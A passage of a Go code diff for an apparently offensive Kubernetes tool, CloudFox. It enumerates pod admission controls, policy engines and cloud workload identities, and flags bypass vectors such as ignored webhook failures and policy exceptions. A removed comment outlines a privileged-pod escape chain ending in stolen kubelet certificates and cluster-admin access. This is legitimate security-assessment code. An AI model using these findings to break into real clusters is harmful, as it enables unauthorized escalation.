@@ -11,6 +11,7 @@ import (
 	"github.com/BishopFox/cloudfox/internal"
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/BishopFox/cloudfox/kubernetes/shared"
+	"github.com/BishopFox/cloudfox/kubernetes/shared/admission"
 	"github.com/spf13/cobra"
 	corev1 "k8s.io/api/core/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
@@ -26,21 +27,45 @@ var PodAdmissionCmd = &cobra.Command{
 	Short:   "Analyze pod admission controllers, policies, and security enforcement",
 	Long: `
 Analyze all cluster pod admission configurations including:
+
+Pod Security Standards & Policies:
   - Pod Security Standards (PSS) - enforce/warn/audit levels
   - Pod Security Policies (PSP) - deprecated but detected
-  - Admission webhooks (mutating/validating) with selector analysis
-  - Policy engines (Gatekeeper, Kyverno, Kubewarden, jsPolicy, Polaris, Datree)
-  - ValidatingAdmissionPolicy (K8s 1.26+)
-  - Gatekeeper mutation policies (Assign, AssignMetadata, ModifySet)
-  - Policy exceptions and bypass vectors
   - PSS exemptions analysis
 
-  cloudfox kubernetes pod-admission`,
+Admission Controllers:
+  - Admission webhooks (mutating/validating) with selector analysis
+  - ValidatingAdmissionPolicy (K8s 1.26+)
+  - Policy engines (Gatekeeper, Kyverno, Kubewarden, jsPolicy, Polaris, Datree)
+  - Gatekeeper mutation policies (Assign, AssignMetadata, ModifySet)
+  - Policy exceptions and bypass vectors
+
+Cloud Workload Identity (in-cluster detection):
+  Detects cloud workload identity configurations from in-cluster resources.
+  No --cloud-provider flag required - reads CRDs and annotations directly.
+
+  AWS EKS:
+    - Pod Identity Associations (amazon-eks-pod-identity CRDs)
+    - IRSA annotations on ServiceAccounts
+
+  GCP GKE:
+    - Workload Identity annotations (iam.gke.io/gcp-service-account)
+    - GCP Service Account bindings
+
+  Azure AKS:
+    - Azure Workload Identity (azure.workload.identity annotations)
+    - AAD Pod Identity (AzureIdentity, AzureIdentityBinding CRDs - legacy)
+
+Examples:
+  cloudfox kubernetes pod-admission
+  cloudfox kubernetes pod-admission --detailed`,
 	Run: ListPodAdmission,
 }
 
 // PodSecurityCmd is an alias for backwards compatibility
 var PodSecurityCmd = PodAdmissionCmd
+
+// init() removed - detailed flag is now a global persistent flag in cli/kubernetes.go
 
 type PodAdmissionOutput struct {
 	Table []internal.TableFile
@@ -57,7 +82,6 @@ type PodSecurityFinding struct {
 	Age       string
 
 	// Security Analysis
-	RiskLevel      string
 	SecurityIssues []string
 
 	// Pod Security Standards (PSS)
@@ -75,7 +99,6 @@ type PodSecurityFinding struct {
 	PSPCount             int
 	PSPNames             []string
 	ClusterHasPSP        bool
-	PSPDeprecationRisk   string
 	PSPAllowsPrivileged  bool
 	PSPAllowsHostNetwork bool
 	PSPAllowsHostPID     bool
@@ -88,7 +111,6 @@ type PodSecurityFinding struct {
 	MutatingWebhooks   []WebhookInfo
 	ValidatingWebhooks []WebhookInfo
 	WebhookCount       int
-	WebhookBypassRisk  string
 
 	// Dynamic Policy Engines
 	GatekeeperPolicies []string
@@ -130,11 +152,9 @@ type PodSecurityFinding struct {
 	// Policy Conflicts
 	HasConflicts    bool
 	ConflictDetails []string
-	ConflictRisk    string
 
 	// Policy Bypass Techniques
 	BypassTechniques []string
-	BypassRisk       string
 
 	// Attack Vectors
 	AllowsPrivilegeEscalation bool
@@ -142,6 +162,16 @@ type PodSecurityFinding struct {
 
 	// Recommendations
 	Recommendations []string
+}
+
+// PodEnumeratedPolicy represents a unified policy entry across all tools
+type PodEnumeratedPolicy struct {
+	Namespace string
+	Tool      string
+	Name      string
+	Scope     string
+	Type      string
+	Details   string
 }
 
 // WebhookInfo represents webhook configuration details
@@ -154,15 +184,13 @@ type WebhookInfo struct {
 	TimeoutSeconds    int32
 	NamespaceSelector string
 	HasExclusions     bool
-	BypassRisk        string
 	SecurityIssues    []string
 }
 
 // PSPAnalysis represents Pod Security Policy analysis
 type PSPAnalysis struct {
-	Name                string
-	RiskLevel           string
-	AllowsPrivileged    bool
+	Name             string
+	AllowsPrivileged bool
 	AllowsHostNetwork   bool
 	AllowsHostPID       bool
 	AllowsHostIPC       bool
@@ -189,7 +217,6 @@ type PSSAnalysis struct {
 	ExemptReason    string
 	NoEnforcement   bool
 	WeakEnforcement bool
-	RiskLevel       string
 	SecurityIssues  []string
 }
 
@@ -199,7 +226,6 @@ type PolicyEscalationPath struct {
 	Policy    string
 	Steps     []string
 	EndResult string
-	RiskLevel string
 }
 
 // CloudWorkloadIdentityInfo tracks cloud provider workload identity configurations
@@ -404,7 +430,7 @@ type WebhookSelectorInfo struct {
 // verifyPodAdmissionImage checks if an image matches known patterns for the specified engine
 // Now uses the shared admission SDK for centralized engine detection
 func verifyPodAdmissionImage(image string, engine string) bool {
-	return VerifyControllerImage(image, engine)
+	return admission.VerifyControllerImage(image, engine)
 }
 
 // PolicyEngineBlocking tracks which dangerous capabilities are blocked by policy engines
@@ -436,6 +462,7 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
 	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
 	format, _ := parentCmd.PersistentFlags().GetString("output")
+	detailed := globals.K8sDetailed
 
 	logger.InfoM(fmt.Sprintf("Analyzing pod security policies for %s", globals.ClusterName), globals.K8S_POD_SECURITY_MODULE_NAME)
 
@@ -494,6 +521,22 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 
 	// Analyze PSS exemptions (from namespace annotations or cluster config)
 	pssExemptions := analyzePSSExemptions(ctx, clientset)
+
+	// Analyze Capsule tenant pod policies
+	logger.InfoM("Analyzing Capsule tenant pod policies...", globals.K8S_POD_SECURITY_MODULE_NAME)
+	capsuleTenantPodPolicies := analyzeCapsuleTenantPodPolicies(ctx, dynClient)
+
+	// Analyze Rancher project pod policies
+	logger.InfoM("Analyzing Rancher project pod policies...", globals.K8S_POD_SECURITY_MODULE_NAME)
+	rancherProjectPodPolicies := analyzeRancherProjectPodPolicies(ctx, dynClient)
+
+	// Log multitenancy pod policy findings
+	if len(capsuleTenantPodPolicies) > 0 {
+		logger.InfoM(fmt.Sprintf("Found %d Capsule tenant pod policies", len(capsuleTenantPodPolicies)), globals.K8S_POD_SECURITY_MODULE_NAME)
+	}
+	if len(rancherProjectPodPolicies) > 0 {
+		logger.InfoM(fmt.Sprintf("Found %d Rancher project pod policies", len(rancherProjectPodPolicies)), globals.K8S_POD_SECURITY_MODULE_NAME)
+	}
 
 	// Detect policy engine blocking for dangerous capabilities (prevents false positives)
 	policyEngineBlocking := detectPolicyEngineBlocking(
@@ -563,7 +606,6 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 					finding.PSPAllowsRunAsRoot = true
 				}
 			}
-			finding.PSPDeprecationRisk = shared.RiskHigh
 			finding.SecurityIssues = append(finding.SecurityIssues,
 				"PSP is deprecated since Kubernetes 1.21 and removed in 1.25 - migrate to PSS")
 		}
@@ -575,15 +617,9 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 
 		for _, wh := range finding.MutatingWebhooks {
 			finding.SecurityIssues = append(finding.SecurityIssues, wh.SecurityIssues...)
-			if wh.BypassRisk == shared.RiskHigh {
-				finding.WebhookBypassRisk = shared.RiskHigh
-			}
 		}
 		for _, wh := range finding.ValidatingWebhooks {
 			finding.SecurityIssues = append(finding.SecurityIssues, wh.SecurityIssues...)
-			if wh.BypassRisk == shared.RiskHigh {
-				finding.WebhookBypassRisk = shared.RiskHigh
-			}
 		}
 
 		// Policy Engine Counts
@@ -656,25 +692,16 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		// Policy Conflict Detection
 		finding.ConflictDetails = detectPolicyConflicts(finding)
 		finding.HasConflicts = len(finding.ConflictDetails) > 0
-		if finding.HasConflicts {
-			finding.ConflictRisk = shared.RiskMedium
-		}
 
 		// Policy Bypass Detection
 		finding.BypassTechniques = detectPolicyBypass(finding)
-		if len(finding.BypassTechniques) > 0 {
-			finding.BypassRisk = shared.RiskHigh
-		}
 
 		// Escalation Path Detection
 		finding.EscalationPaths = detectPolicyEscalationPaths(finding, pspAnalyses)
 		finding.AllowsPrivilegeEscalation = len(finding.EscalationPaths) > 0
 
-		// Risk Scoring
-		finding.RiskLevel, _ = calculatePolicyRiskScore(finding)
-
-		// Recommendations
-		finding.Recommendations = generatePolicyRecommendations(finding)
+		// Recommendations removed (offensive security tool)
+		// finding.Recommendations = generatePolicyRecommendations(finding)
 
 		findings = append(findings, finding)
 	}
@@ -706,7 +733,7 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		"Timeout",
 		"Namespace Selector",
 		"Side Effects",
-		"Bypass Risk",
+		"Issues",
 	}
 
 	// PSP detail table
@@ -719,6 +746,7 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		"HostPath",
 		"Dangerous Caps",
 		"Run As Root",
+		"Issues",
 	}
 
 	// ValidatingAdmissionPolicy detail table
@@ -728,6 +756,7 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		"Validations",
 		"Param Kind",
 		"Bindings",
+		"Issues",
 	}
 
 	// Gatekeeper Constraints detail table
@@ -737,53 +766,143 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		"Enforcement",
 		"Match",
 		"Violations",
+		"Issues",
 	}
 
 	// Kyverno Policies detail table
 	kyvernoHeaders := []string{
+		"Namespace",
 		"Policy Name",
 		"Scope",
-		"Namespace",
 		"Failure Action",
 		"Rules",
 		"Background",
+		"Issues",
 	}
 
 	// Kyverno Exceptions detail table (bypass vectors!)
 	kyvernoExceptionHeaders := []string{
-		"Exception Name",
 		"Namespace",
+		"Exception Name",
 		"Exempted Policies",
 		"Exempted Rules",
 		"Match",
+		"Issues",
 	}
 
 	// Kubewarden Policies detail table
 	kubewardenHeaders := []string{
+		"Namespace",
 		"Policy Name",
 		"Scope",
-		"Namespace",
 		"Module",
 		"Mode",
 		"Mutating",
 		"Rules",
+		"Issues",
 	}
 
 	// jsPolicy Policies detail table
 	jsPolicyHeaders := []string{
+		"Namespace",
 		"Policy Name",
 		"Scope",
-		"Namespace",
 		"Type",
 		"Operations",
 		"Resources",
 		"Violation Policy",
+		"Issues",
 	}
 
 	// Gatekeeper Exclusions detail table (bypass vectors!)
 	gatekeeperExclusionHeaders := []string{
 		"Excluded Namespace",
 		"Reason",
+		"Issues",
+	}
+
+	// Polaris detail table
+	polarisHeaders := []string{
+		"Namespace",
+		"ConfigMap",
+		"Webhook Enabled",
+		"Checks",
+		"Exemptions",
+		"Privileged Check",
+		"HostNetwork Check",
+		"HostPID Check",
+		"HostIPC Check",
+		"RunAsRoot Check",
+		"Issues",
+	}
+
+	// Datree detail table
+	datreeHeaders := []string{
+		"Webhook Name",
+		"Webhook Enabled",
+		"Privileged Check",
+		"HostNetwork Check",
+		"HostPID Check",
+		"HostIPC Check",
+		"RunAsRoot Check",
+		"Issues",
+	}
+
+	// AWS Pod Identity detail table
+	awsPodIdentityHeaders := []string{
+		"Name",
+		"Namespace",
+		"Service Account",
+		"Role ARN",
+		"Has Wildcard",
+		"Issues",
+	}
+
+	// GCP Workload Identity detail table
+	gcpWorkloadIdentityHeaders := []string{
+		"Name",
+		"Namespace",
+		"K8s Service Account",
+		"GCP Service Account",
+		"Annotation Present",
+		"Issues",
+	}
+
+	// Azure Workload Identity detail table
+	azureWorkloadIdentityHeaders := []string{
+		"Name",
+		"Namespace",
+		"Kind",
+		"Client ID",
+		"Tenant ID",
+		"Selector",
+		"Has Federated",
+		"Issues",
+	}
+
+	// Capsule Tenant Pod Policy detail table
+	capsuleTenantPodHeaders := []string{
+		"Tenant Name",
+		"Namespace",
+		"Pod Security Standard",
+		"Allowed Runtime Classes",
+		"Allowed Priority Classes",
+		"Container Registries",
+		"Has Resource Quotas",
+		"Has Limit Ranges",
+		"Issues",
+	}
+
+	// Rancher Project Pod Policy detail table
+	rancherProjectPodHeaders := []string{
+		"Project Name",
+		"Project ID",
+		"Namespace",
+		"PSP Template ID",
+		"Container Resource Limit",
+		"Namespace Resource Quota",
+		"Has Pod Security Policy",
+		"Issues",
 	}
 
 	var outputRows [][]string
@@ -796,158 +915,32 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 	var kyvernoExceptionRows [][]string
 	var kubewardenRows [][]string
 	var jsPolicyRows [][]string
+	var polarisRows [][]string
+	var datreeRows [][]string
+	var awsPodIdentityRows [][]string
+	var gcpWorkloadIdentityRows [][]string
+	var azureWorkloadIdentityRows [][]string
+	var capsuleTenantPodRows [][]string
+	var rancherProjectPodRows [][]string
 	loot := shared.NewLootBuilder()
 
-	// Initialize loot sections (8 files by technology)
-	loot.Section("PSS").SetHeader(`#####################################
-##### Pod Security Standards (PSS)
+	// Initialize single unified loot section
+	loot.Section("pod-admission").SetHeader(`#####################################
+##### Pod Admission Controls
 #####################################
 #
-# PSS is the modern pod security mechanism (Kubernetes 1.23+)
-# Levels: privileged (no restrictions), baseline (minimal), restricted (hardened)
+# Comprehensive pod admission analysis including:
+# - Pod Security Standards (PSS)
+# - Pod Security Policies (PSP - deprecated)
+# - Admission Webhooks
+# - ValidatingAdmissionPolicy (VAP)
+# - Policy Engines (Gatekeeper, Kyverno, Kubewarden, jsPolicy, Polaris, Datree)
 #
-# Includes:
-# - PSS enumeration commands
-# - Bypass techniques for weak/missing enforcement
-# - Privileged pod deployment for container escape
-#`)
-
-	loot.Section("PSP").SetHeader(`#####################################
-##### Pod Security Policies (PSP) - DEPRECATED
-#####################################
-#
-# WARNING: PSP is deprecated since Kubernetes 1.21
-# REMOVED in Kubernetes 1.25 - migrate to PSS
-#
-# Includes:
-# - PSP enumeration and analysis
-# - PSP exploitation techniques
-# - Service account to PSP binding analysis
-#`)
-
-	loot.Section("Webhooks").SetHeader(`#####################################
-##### Admission Webhooks
-#####################################
-#
-# Mutating and Validating admission webhooks
-# Risk: failurePolicy=Ignore allows bypass when webhook fails
-#
-# Includes:
-# - Webhook enumeration
-# - Bypass techniques (trigger failures)
-# - Namespace exclusion analysis
-#`)
-
-	loot.Section("VAP").SetHeader(`#####################################
-##### ValidatingAdmissionPolicy (K8s 1.26+)
-#####################################
-#
-# Built-in CEL-based policy engine - no webhooks needed
-# Faster and more reliable than webhook-based policies
-#
-# Includes:
-# - VAP enumeration
-# - VAP binding analysis
-# - Bypass techniques
-#`)
-
-	loot.Section("Gatekeeper").SetHeader(`#####################################
-##### OPA Gatekeeper
-#####################################
-#
-# Open Policy Agent for Kubernetes
-# Uses Rego policy language via ConstraintTemplates
-#
-# Includes:
-# - ConstraintTemplate enumeration
-# - Constraint enumeration
-# - Enforcement action analysis (deny/dryrun/warn)
-# - Violation counts
-#`)
-
-	loot.Section("Kyverno").SetHeader(`#####################################
-##### Kyverno
-#####################################
-#
-# Kubernetes-native policy engine
-# Uses YAML-based policies (no new language)
-#
-# IMPORTANT: Check PolicyExceptions - these are bypass vectors!
-#
-# Includes:
-# - ClusterPolicy enumeration
-# - Policy enumeration (namespace-scoped)
-# - PolicyException enumeration (BYPASS VECTORS)
-# - Enforcement action analysis
-#`)
-
-	loot.Section("Kubewarden").SetHeader(`#####################################
-##### Kubewarden
-#####################################
-#
-# WebAssembly-based policy engine
-# Policies are WASM modules
-#
-# Includes:
-# - ClusterAdmissionPolicy enumeration
-# - AdmissionPolicy enumeration
-# - Mode analysis (protect/monitor)
-#`)
-
-	loot.Section("jsPolicy").SetHeader(`#####################################
-##### jsPolicy
-#####################################
-#
-# JavaScript/TypeScript-based policy engine
-# Uses familiar JS syntax for policies
-#
-# Includes:
-# - ClusterJsPolicy enumeration
-# - JsPolicy enumeration (namespace-scoped)
-# - Policy type analysis (Validating/Mutating/Controller)
-#`)
-
-	loot.Section("Polaris").SetHeader(`#####################################
-##### Polaris
-#####################################
-#
-# Kubernetes best practices validation (Fairwinds)
-# Checks for security, efficiency, and reliability
-#
-# Includes:
-# - Webhook detection
-# - Configuration analysis
-# - Exemption enumeration
-#`)
-
-	loot.Section("Datree").SetHeader(`#####################################
-##### Datree
-#####################################
-#
-# Policy-as-code admission controller
-# Validates Kubernetes manifests against policies
-#
-# Includes:
-# - Webhook detection
-# - Policy configuration
-#`)
-
-	loot.Section("Privileged-Pods").SetHeader(`#####################################
-##### Privileged Pod Deployment
-#####################################
-#
-# Ready-to-use privileged pod YAMLs for vulnerable namespaces
-# Use these to deploy container escape pods
-#
-# Attack chain:
-# 1. Deploy privileged pod with hostPath: /
-# 2. Exec into pod
-# 3. Access /host for full node filesystem
-# 4. Steal kubelet certs, escalate to cluster-admin
+# This file contains enumeration commands for detected tools only.
 #`)
 
 	if globals.KubeContext != "" {
-		loot.Section("PSS").Addf("kubectl config use-context %s\n", globals.KubeContext)
+		loot.Section("pod-admission").Addf("kubectl config use-context %s\n", globals.KubeContext)
 	}
 
 	for _, finding := range findings {
@@ -1031,26 +1024,21 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			dangerousCaps = "No"
 		}
 
-		// Webhook bypass risk - show the reason
+		// Webhook bypass - show webhooks with Ignore failure policy
 		webhookBypass := "<NONE>"
-		if finding.WebhookBypassRisk == shared.RiskHigh {
-			// Collect bypass reasons
-			var bypassReasons []string
-			for _, wh := range finding.MutatingWebhooks {
-				if wh.FailurePolicy == "Ignore" {
-					bypassReasons = append(bypassReasons, fmt.Sprintf("%s (failurePolicy:Ignore)", wh.Name))
-				}
+		var bypassReasons []string
+		for _, wh := range finding.MutatingWebhooks {
+			if wh.FailurePolicy == "Ignore" {
+				bypassReasons = append(bypassReasons, fmt.Sprintf("%s (failurePolicy:Ignore)", wh.Name))
 			}
-			for _, wh := range finding.ValidatingWebhooks {
-				if wh.FailurePolicy == "Ignore" {
-					bypassReasons = append(bypassReasons, fmt.Sprintf("%s (failurePolicy:Ignore)", wh.Name))
-				}
+		}
+		for _, wh := range finding.ValidatingWebhooks {
+			if wh.FailurePolicy == "Ignore" {
+				bypassReasons = append(bypassReasons, fmt.Sprintf("%s (failurePolicy:Ignore)", wh.Name))
 			}
-			if len(bypassReasons) > 0 {
-				webhookBypass = strings.Join(bypassReasons, ", ")
-			} else {
-				webhookBypass = "Yes"
-			}
+		}
+		if len(bypassReasons) > 0 {
+			webhookBypass = strings.Join(bypassReasons, ", ")
 		}
 
 		// Policy Engines - consolidated column
@@ -1136,9 +1124,24 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		if sideEffects == "" {
 			sideEffects = "<NONE>"
 		}
-		bypassRisk := "<NONE>"
+
+		// Detect issues
+		var whIssues []string
 		if wh.FailurePolicy == "Ignore" {
-			bypassRisk = "Yes"
+			whIssues = append(whIssues, "Failure policy Ignore (bypassable)")
+		}
+		if wh.HasExclusions {
+			whIssues = append(whIssues, "Has namespace exclusions")
+		}
+		if wh.SideEffects == "Unknown" || wh.SideEffects == "Some" {
+			whIssues = append(whIssues, "Side effects not None")
+		}
+		if wh.TimeoutSeconds > 10 {
+			whIssues = append(whIssues, "Long timeout")
+		}
+		whIssuesStr := "<NONE>"
+		if len(whIssues) > 0 {
+			whIssuesStr = strings.Join(whIssues, "; ")
 		}
 
 		webhookRows = append(webhookRows, []string{
@@ -1148,7 +1151,7 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			timeoutStr,
 			nsSelector,
 			sideEffects,
-			bypassRisk,
+			whIssuesStr,
 		})
 	}
 
@@ -1165,9 +1168,24 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		if sideEffects == "" {
 			sideEffects = "<NONE>"
 		}
-		bypassRisk := "<NONE>"
+
+		// Detect issues
+		var whIssues []string
 		if wh.FailurePolicy == "Ignore" {
-			bypassRisk = "Yes"
+			whIssues = append(whIssues, "Failure policy Ignore (bypassable)")
+		}
+		if wh.HasExclusions {
+			whIssues = append(whIssues, "Has namespace exclusions")
+		}
+		if wh.SideEffects == "Unknown" || wh.SideEffects == "Some" {
+			whIssues = append(whIssues, "Side effects not None")
+		}
+		if wh.TimeoutSeconds > 10 {
+			whIssues = append(whIssues, "Long timeout")
+		}
+		whIssuesStr := "<NONE>"
+		if len(whIssues) > 0 {
+			whIssuesStr = strings.Join(whIssues, "; ")
 		}
 
 		webhookRows = append(webhookRows, []string{
@@ -1177,7 +1195,7 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			timeoutStr,
 			nsSelector,
 			sideEffects,
-			bypassRisk,
+			whIssuesStr,
 		})
 	}
 
@@ -1197,6 +1215,34 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			capsStr = strings.Join(psp.AllowedCapabilities, ", ")
 		}
 
+		// Detect issues
+		var pspIssues []string
+		if psp.AllowsPrivileged {
+			pspIssues = append(pspIssues, "Allows privileged")
+		}
+		if psp.AllowsHostNetwork {
+			pspIssues = append(pspIssues, "Allows hostNetwork")
+		}
+		if psp.AllowsHostPID {
+			pspIssues = append(pspIssues, "Allows hostPID")
+		}
+		if psp.AllowsHostIPC {
+			pspIssues = append(pspIssues, "Allows hostIPC")
+		}
+		if psp.AllowsHostPath {
+			pspIssues = append(pspIssues, "Allows hostPath")
+		}
+		if len(psp.AllowedCapabilities) > 0 {
+			pspIssues = append(pspIssues, "Dangerous capabilities")
+		}
+		if psp.AllowsRunAsRoot {
+			pspIssues = append(pspIssues, "Allows runAsRoot")
+		}
+		pspIssuesStr := "<NONE>"
+		if len(pspIssues) > 0 {
+			pspIssuesStr = strings.Join(pspIssues, "; ")
+		}
+
 		pspRows = append(pspRows, []string{
 			psp.Name,
 			shared.FormatBool(psp.AllowsPrivileged),
@@ -1206,6 +1252,7 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			hostPathStr,
 			capsStr,
 			shared.FormatBool(psp.AllowsRunAsRoot),
+			pspIssuesStr,
 		})
 	}
 
@@ -1226,12 +1273,29 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			paramKind = "<NONE>"
 		}
 
+		// Detect issues
+		var vapIssues []string
+		if failurePolicy == "Ignore" {
+			vapIssues = append(vapIssues, "Failure policy Ignore")
+		}
+		if vap.Validations == 0 {
+			vapIssues = append(vapIssues, "No validations defined")
+		}
+		if len(vap.Bindings) == 0 {
+			vapIssues = append(vapIssues, "No bindings")
+		}
+		vapIssuesStr := "<NONE>"
+		if len(vapIssues) > 0 {
+			vapIssuesStr = strings.Join(vapIssues, "; ")
+		}
+
 		vapRows = append(vapRows, []string{
 			vap.Name,
 			failurePolicy,
 			fmt.Sprintf("%d", vap.Validations),
 			paramKind,
 			bindingsStr,
+			vapIssuesStr,
 		})
 	}
 
@@ -1242,12 +1306,26 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			matchStr = "<NONE>"
 		}
 
+		// Detect issues
+		var gkIssues []string
+		if constraint.EnforcementAction == "dryrun" || constraint.EnforcementAction == "warn" {
+			gkIssues = append(gkIssues, "Not enforcing ("+constraint.EnforcementAction+")")
+		}
+		if constraint.Violations > 0 {
+			gkIssues = append(gkIssues, fmt.Sprintf("%d violations", constraint.Violations))
+		}
+		gkIssuesStr := "<NONE>"
+		if len(gkIssues) > 0 {
+			gkIssuesStr = strings.Join(gkIssues, "; ")
+		}
+
 		gatekeeperRows = append(gatekeeperRows, []string{
 			constraint.Name,
 			constraint.Kind,
 			constraint.EnforcementAction,
 			matchStr,
 			fmt.Sprintf("%d", constraint.Violations),
+			gkIssuesStr,
 		})
 	}
 
@@ -1265,13 +1343,30 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			failureAction = "Audit"
 		}
 
+		// Detect issues
+		var kyIssues []string
+		if failureAction == "Audit" {
+			kyIssues = append(kyIssues, "Audit mode (not enforcing)")
+		}
+		if policy.Rules == 0 {
+			kyIssues = append(kyIssues, "No rules defined")
+		}
+		if !policy.Background {
+			kyIssues = append(kyIssues, "Background processing disabled")
+		}
+		kyIssuesStr := "<NONE>"
+		if len(kyIssues) > 0 {
+			kyIssuesStr = strings.Join(kyIssues, "; ")
+		}
+
 		kyvernoRows = append(kyvernoRows, []string{
+			ns,
 			policy.Name,
 			scope,
-			ns,
 			failureAction,
 			fmt.Sprintf("%d", policy.Rules),
 			shared.FormatBool(policy.Background),
+			kyIssuesStr,
 		})
 	}
 
@@ -1292,12 +1387,21 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			matchStr = "<NONE>"
 		}
 
+		// Detect issues (all exceptions are potential bypass vectors)
+		var exIssues []string
+		exIssues = append(exIssues, "Policy bypass vector")
+		if len(exception.Policies) > 1 {
+			exIssues = append(exIssues, fmt.Sprintf("Exempts %d policies", len(exception.Policies)))
+		}
+		exIssuesStr := strings.Join(exIssues, "; ")
+
 		kyvernoExceptionRows = append(kyvernoExceptionRows, []string{
-			exception.Name,
 			exception.Namespace,
+			exception.Name,
 			policiesStr,
 			rulesStr,
 			matchStr,
+			exIssuesStr,
 		})
 	}
 
@@ -1320,14 +1424,28 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			rulesStr = "<NONE>"
 		}
 
+		// Detect issues
+		var kwIssues []string
+		if policy.Mode == "monitor" {
+			kwIssues = append(kwIssues, "Monitor mode (not enforcing)")
+		}
+		if module == "" || module == "<NONE>" {
+			kwIssues = append(kwIssues, "No module specified")
+		}
+		kwIssuesStr := "<NONE>"
+		if len(kwIssues) > 0 {
+			kwIssuesStr = strings.Join(kwIssues, "; ")
+		}
+
 		kubewardenRows = append(kubewardenRows, []string{
+			ns,
 			policy.Name,
 			scope,
-			ns,
 			module,
 			policy.Mode,
 			shared.FormatBool(policy.Mutating),
 			rulesStr,
+			kwIssuesStr,
 		})
 	}
 
@@ -1355,190 +1473,704 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 			violationPolicy = "deny"
 		}
 
+		// Detect issues
+		var jsIssues []string
+		if violationPolicy != "deny" {
+			jsIssues = append(jsIssues, "Not enforcing ("+violationPolicy+")")
+		}
+		if len(policy.Operations) == 0 {
+			jsIssues = append(jsIssues, "No operations defined")
+		}
+		if len(policy.Resources) == 0 {
+			jsIssues = append(jsIssues, "No resources defined")
+		}
+		jsIssuesStr := "<NONE>"
+		if len(jsIssues) > 0 {
+			jsIssuesStr = strings.Join(jsIssues, "; ")
+		}
+
 		jsPolicyRows = append(jsPolicyRows, []string{
+			ns,
 			policy.Name,
 			scope,
-			ns,
 			policy.Type,
 			opsStr,
 			resStr,
 			violationPolicy,
+			jsIssuesStr,
 		})
 	}
 
 	// Generate Gatekeeper exclusion rows (bypass vectors!)
 	for _, excludedNs := range gatekeeperConfig.ExcludedNamespaces {
+		// All exclusions are potential bypass vectors
 		gatekeeperExclusionRows = append(gatekeeperExclusionRows, []string{
 			excludedNs,
 			"Config.spec.match.excludedNamespaces",
+			"Policy bypass vector",
+		})
+	}
+
+	// Generate Polaris detail rows
+	if polarisConfig.WebhookEnabled || polarisConfig.ConfigMap != "" {
+		var polarisIssues []string
+		if !polarisConfig.WebhookEnabled {
+			polarisIssues = append(polarisIssues, "Webhook disabled")
+		}
+		if !polarisConfig.PrivilegedCheckEnabled {
+			polarisIssues = append(polarisIssues, "Privileged check disabled")
+		}
+		if !polarisConfig.HostNetworkCheckEnabled {
+			polarisIssues = append(polarisIssues, "HostNetwork check disabled")
+		}
+		if !polarisConfig.HostPIDCheckEnabled {
+			polarisIssues = append(polarisIssues, "HostPID check disabled")
+		}
+		if !polarisConfig.RunAsRootCheckEnabled {
+			polarisIssues = append(polarisIssues, "RunAsRoot check disabled")
+		}
+		if polarisConfig.Exemptions > 0 {
+			polarisIssues = append(polarisIssues, fmt.Sprintf("%d exemptions configured", polarisConfig.Exemptions))
+		}
+		issuesStr := "<NONE>"
+		if len(polarisIssues) > 0 {
+			issuesStr = strings.Join(polarisIssues, "; ")
+		}
+		polarisRows = append(polarisRows, []string{
+			polarisConfig.Namespace,
+			polarisConfig.ConfigMap,
+			shared.FormatBool(polarisConfig.WebhookEnabled),
+			fmt.Sprintf("%d", polarisConfig.Checks),
+			fmt.Sprintf("%d", polarisConfig.Exemptions),
+			shared.FormatBool(polarisConfig.PrivilegedCheckEnabled),
+			shared.FormatBool(polarisConfig.HostNetworkCheckEnabled),
+			shared.FormatBool(polarisConfig.HostPIDCheckEnabled),
+			shared.FormatBool(polarisConfig.HostIPCCheckEnabled),
+			shared.FormatBool(polarisConfig.RunAsRootCheckEnabled),
+			issuesStr,
+		})
+	}
+
+	// Generate Datree detail rows
+	if datreeConfig.WebhookEnabled {
+		var datreeIssues []string
+		if !datreeConfig.PrivilegedCheckEnabled {
+			datreeIssues = append(datreeIssues, "Privileged check disabled")
+		}
+		if !datreeConfig.HostNetworkCheckEnabled {
+			datreeIssues = append(datreeIssues, "HostNetwork check disabled")
+		}
+		if !datreeConfig.HostPIDCheckEnabled {
+			datreeIssues = append(datreeIssues, "HostPID check disabled")
+		}
+		if !datreeConfig.RunAsRootCheckEnabled {
+			datreeIssues = append(datreeIssues, "RunAsRoot check disabled")
+		}
+		issuesStr := "<NONE>"
+		if len(datreeIssues) > 0 {
+			issuesStr = strings.Join(datreeIssues, "; ")
+		}
+		datreeRows = append(datreeRows, []string{
+			datreeConfig.WebhookName,
+			shared.FormatBool(datreeConfig.WebhookEnabled),
+			shared.FormatBool(datreeConfig.PrivilegedCheckEnabled),
+			shared.FormatBool(datreeConfig.HostNetworkCheckEnabled),
+			shared.FormatBool(datreeConfig.HostPIDCheckEnabled),
+			shared.FormatBool(datreeConfig.HostIPCCheckEnabled),
+			shared.FormatBool(datreeConfig.RunAsRootCheckEnabled),
+			issuesStr,
+		})
+	}
+
+	// Generate AWS Pod Identity detail rows
+	for _, identity := range awsPodIdentities {
+		var awsIssues []string
+		if identity.HasWildcard {
+			awsIssues = append(awsIssues, "Wildcard SA binding (overly permissive)")
+		}
